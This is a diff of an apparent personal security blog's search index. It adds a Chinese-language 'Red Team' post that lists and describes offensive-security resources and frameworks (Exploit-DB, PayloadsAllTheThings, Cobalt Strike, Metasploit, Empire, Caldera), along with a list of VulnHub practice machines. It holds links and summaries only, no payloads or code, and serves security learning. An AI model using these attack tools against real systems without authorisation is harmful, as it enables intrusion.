-<li><a href="../KIOPTRIX-LEVEL-1-1">KIOPTRIX: LEVEL 1.1</a></li>
-<li><a href="../KIOPTRIX-LEVEL-1-2">KIOPTRIX: LEVEL 1.2</a></li>
-</ul>
-<p>.<br>.<br>.</p>
-<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><ul>
-<li><a href="../HACK-ME-PLEASE-1">HACK ME PLEASE: 1</a></li>
-</ul>
-<p>.<br>.<br>.</p>
-]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SSRF</title>
     <url>/2024/12/09/SSRF/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
@@ -1266,6 +1173,25 @@ Since the original query returns two columns and only the second column can stor
       </tags>
   </entry>
   <entry>
+    <title>VulnHub</title>
+    <url>/2024/11/30/VulnHub/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><ul>
+<li><a href="../KIOPTRIX-LEVEL-1">KIOPTRIX: LEVEL 1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-1">KIOPTRIX: LEVEL 1.1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-2">KIOPTRIX: LEVEL 1.2</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><ul>
+<li><a href="../HACK-ME-PLEASE-1">HACK ME PLEASE: 1</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>picoCTF</title>
     <url>/2024/11/30/picoCTF/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a class="link"   href="https://hackmd.io/@dinosaur/HJpK08aQh" >https://hackmd.io/@dinosaur/HJpK08aQh<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -1274,6 +1200,42 @@ Since the original query returns two columns and only the second column can stor
 ]]></content>
       <tags>
         <tag>picoCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Red Team</title>
+    <url>/2024/12/08/Red-Team/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="1-專注於滲透測試和攻擊腳本的資源"><a href="#1-專注於滲透測試和攻擊腳本的資源" class="headerlink" title="1. 專注於滲透測試和攻擊腳本的資源"></a><strong>1. 專注於滲透測試和攻擊腳本的資源</strong></h4><h5 id="1-Exploit-Database-Exploit-DB"><a href="#1-Exploit-Database-Exploit-DB" class="headerlink" title="(1) Exploit Database (Exploit-DB)"></a><strong>(1) <a class="link"   href="https://www.exploit-db.com/" >Exploit Database (Exploit-DB)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><h5 id="2-GitHub"><a href="#2-GitHub" class="headerlink" title="(2) GitHub"></a><strong>(2) <a class="link"   href="https://github.com/" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Search: <code>red team scripts</code>、<code>offensive security</code>、<code>post exploitation</code> </p>
+<hr>
+<h4 id="2-專注於紅隊技術的資源"><a href="#2-專注於紅隊技術的資源" class="headerlink" title="2. 專注於紅隊技術的資源"></a><strong>2. 專注於紅隊技術的資源</strong></h4><h5 id="1-Red-Team-Academy"><a href="#1-Red-Team-Academy" class="headerlink" title="(1) Red Team Academy"></a><strong>(1) <a class="link"   href="https://www.redteamacademy.com/" >Red Team Academy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>專注於紅隊技術學習，提供完整的紅隊作業流程，包括社交工程和後滲透技術等。這些內容幫助學習者根據目標環境設計定制化的攻擊劇本，以及進行紅隊任務中的腳本化自動化操作。</p>
+<h5 id="2-PayloadsAllTheThings"><a href="#2-PayloadsAllTheThings" class="headerlink" title="(2) PayloadsAllTheThings"></a><strong>(2) <a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings" >PayloadsAllTheThings<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>這是一個專注於各種攻擊向量的 GitHub 資源庫，包括 SQL Injection、XSS、SSRF 等攻擊場景。它提供了豐富的 Payload 示例，幫助學習者將這些 Payload 整合到自己的攻擊腳本中，並應用於多種場景。</p>
+<h5 id="3-TrustedSec-Blog"><a href="#3-TrustedSec-Blog" class="headerlink" title="(3) TrustedSec Blog"></a><strong>(3) <a class="link"   href="https://www.trustedsec.com/blog/" >TrustedSec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TrustedSec 提供最新的紅隊工具與技術分析，分享實際攻擊場景的案例研究。透過這些資源，學習者能更有效地在紅隊演練中應用工具與腳本。</p>
+<h5 id="4-dmcxblue"><a href="#4-dmcxblue" class="headerlink" title="(4) dmcxblue"></a><strong>(4) <a class="link"   href="https://dmcxblue.net/" >dmcxblue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>dmcxblue 提供紅隊技術相關的文章和研究，涵蓋多種進階攻擊技術和工具的使用。特別適合想了解攻擊理論和實踐的學習者。</p>
+<h5 id="5-Ired-Team"><a href="#5-Ired-Team" class="headerlink" title="(5) Ired Team"></a><strong>(5) <span style="color: green;"><a class="link"   href="https://www.ired.team/" >Ired Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>Ired Team 提供紅隊技術的實踐指南，涵蓋滲透測試和後滲透技術的深入研究，適合學習高階的攻擊操作。</p>
+<h5 id="6-Rawsec-Blog"><a href="#6-Rawsec-Blog" class="headerlink" title="(6) Rawsec Blog"></a><strong>(6) <span style="color: green;"><a class="link"   href="https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/" >Rawsec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>專注於網絡滲透技術，特別是關於網絡橫向移動和數據隧道化的實踐案例。</p>
+<hr>
+<h4 id="3-模擬演練和學習攻擊腳本的平台"><a href="#3-模擬演練和學習攻擊腳本的平台" class="headerlink" title="3. 模擬演練和學習攻擊腳本的平台"></a><strong>3. 模擬演練和學習攻擊腳本的平台</strong></h4><h5 id="1-Hack-The-Box"><a href="#1-Hack-The-Box" class="headerlink" title="(1) Hack The Box"></a><strong>(1) <span style="color: green;"><a class="link"   href="https://www.hackthebox.com/" >Hack The Box<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>Hack The Box 提供一個互動學習平台，專注於紅隊與藍隊的模擬攻擊場景，適合學習如何在實際演練中使用攻擊腳本。它涵蓋從基礎到高級的滲透測試挑戰，幫助學習者針對不同場景進行腳本開發與應用。</p>
+<h5 id="2-VulnHub"><a href="#2-VulnHub" class="headerlink" title="(2) VulnHub"></a><strong>(2) <a class="link"   href="https://www.vulnhub.com/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>VulnHub 提供可下載的靶機映像，讓學習者可以在本地虛擬環境中進行滲透測試演練，從而提升實戰能力。涵蓋多種難度和場景，適合從初學者到高級使用者。</p>
+<h5 id="3-TryHackMe"><a href="#3-TryHackMe" class="headerlink" title="(3) TryHackMe"></a><strong>(3) <a class="link"   href="https://tryhackme.com/" >TryHackMe<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TryHackMe 提供專門的腳本化攻擊課程，包括 CTF 和專業紅隊技能訓練環境，幫助學習者從基礎腳本開發到複雜攻擊劇本的實踐操作，並結合 <code>pwntools</code> 等工具進行實作。</p>
+<h5 id="4-RangeForce"><a href="#4-RangeForce" class="headerlink" title="(4) RangeForce"></a><strong>(4) <a class="link"   href="https://www.rangeforce.com/" >RangeForce<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>RangeForce 模擬企業場域的防禦與攻擊演練，針對紅隊演練特性提供深度學習環境。學習者可以在此學習如何應對企業防禦措施，並開發和調整針對實際場域的攻擊腳本。</p>
+<h5 id="5-BloodHound"><a href="#5-BloodHound" class="headerlink" title="(5) BloodHound"></a><strong>(5) <a class="link"   href="https://bloodhound.readthedocs.io/" >BloodHound<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>BloodHound 是一個用於內網環境分析的工具，特別針對 Active Directory（AD）環境進行攻擊路徑探索與分析，幫助學習者設計內網滲透策略。</p>
+<h5 id="6-Offensive-Security-Learning-Paths"><a href="#6-Offensive-Security-Learning-Paths" class="headerlink" title="(6) Offensive Security Learning Paths"></a><strong>(6) <span style="color: green;"><a class="link"   href="https://www.offsec.com/learning/paths/" >Offensive Security Learning Paths<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>Offensive Security 提供結構化的學習路徑，幫助學習者從基礎滲透測試技能逐步提升到高級攻擊技術。</p>
+<h5 id="7-GOAD-GitHub"><a href="#7-GOAD-GitHub" class="headerlink" title="(7) GOAD (GitHub)"></a><strong>(7) <span style="color: green;"><a class="link"   href="https://github.com/Orange-Cyberdefense/GOAD" >GOAD (GitHub)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>GOAD 是一個 Active Directory 滲透測試學習實驗室，專注於內網攻擊和紅隊實踐，幫助學習者深入了解 AD 的攻擊技巧。</p>
+<h5 id="8-PortSwigger"><a href="#8-PortSwigger" class="headerlink" title="(8) PortSwigger"></a><strong>(8) <span style="color: green;"><a class="link"   href="https://portswigger.net/" >PortSwigger<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>PortSwigger 提供滲透測試和安全研究的工具和資源，包括廣泛使用的 Burp Suite，幫助學習者掌握滲透測試技能。</p>
+<hr>
+<h4 id="4-特定工具與框架學習資源"><a href="#4-特定工具與框架學習資源" class="headerlink" title="4. 特定工具與框架學習資源"></a><strong>4. 特定工具與框架學習資源</strong></h4><h5 id="1-Cobalt-Strike-Documentation"><a href="#1-Cobalt-Strike-Documentation" class="headerlink" title="(1) Cobalt Strike Documentation"></a><strong>(1) <a class="link"   href="https://www.cobaltstrike.com/support/user-manuals" >Cobalt Strike Documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供詳細的 Cobalt Strike 使用指南，特別是 Aggressor Scripts 的編寫與應用教學。這幫助學習者了解攻擊腳本的開發流程，並結合現有工具實現任務的自動化腳本設計。</p>
+<h5 id="2-Metasploit-Unleashed"><a href="#2-Metasploit-Unleashed" class="headerlink" title="(2) Metasploit Unleashed"></a><strong>(2) <a class="link"   href="https://www.offensive-security.com/metasploit-unleashed/" >Metasploit Unleashed<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Metasploit 的官方教學，涵蓋腳本模組的開發與應用。學習者可以透過這些內容掌握如何根據需求設計自定義攻擊腳本，以及熟悉 Metasploit 框架的腳本化操作流程。</p>
+<h5 id="3-MITRE-ATT-CK-Framework"><a href="#3-MITRE-ATT-CK-Framework" class="headerlink" title="(3) MITRE ATT&amp;CK Framework"></a><strong>(3) <a class="link"   href="https://attack.mitre.org/" >MITRE ATT&amp;CK Framework<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供標準化的攻擊技術與場景資料庫，幫助學習者模擬 ATT&amp;CK 技術腳本的實現，並設計符合紅隊演練場景的攻擊腳本。</p>
+<h5 id="4-Empire"><a href="#4-Empire" class="headerlink" title="(4) Empire"></a><strong>(4) <a class="link"   href="https://github.com/BC-SECURITY/Empire" >Empire<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Empire 是一個強大的後滲透測試框架，支持腳本化的滲透測試活動，適合進行模擬攻擊與自動化操作。</p>
+<h5 id="5-MITRE-Caldera"><a href="#5-MITRE-Caldera" class="headerlink" title="(5) MITRE Caldera"></a><strong>(5) <a class="link"   href="https://caldera.mitre.org/" >MITRE Caldera<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>MITRE Caldera 是一個自動化紅隊模擬框架，專注於模擬真實的攻擊行為，幫助學習者測試與了解各種攻擊技術。適合用於模擬企業場域的攻擊活動。</p>
+<h5 id="6-Atomic-Red-Team"><a href="#6-Atomic-Red-Team" class="headerlink" title="(6) Atomic Red Team"></a><strong>(6) <a class="link"   href="https://github.com/redcanaryco/atomic-red-team" >Atomic Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Atomic Red Team 提供一組開放式的攻擊技術測試框架，幫助學習者快速測試與模擬常見的攻擊技巧，並結合 MITRE ATT&amp;CK 進行實踐。</p>
+<hr>
+<ul>
+<li><a class="link"   href="https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist/" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>other</tag>
       </tags>
   </entry>
 </search>
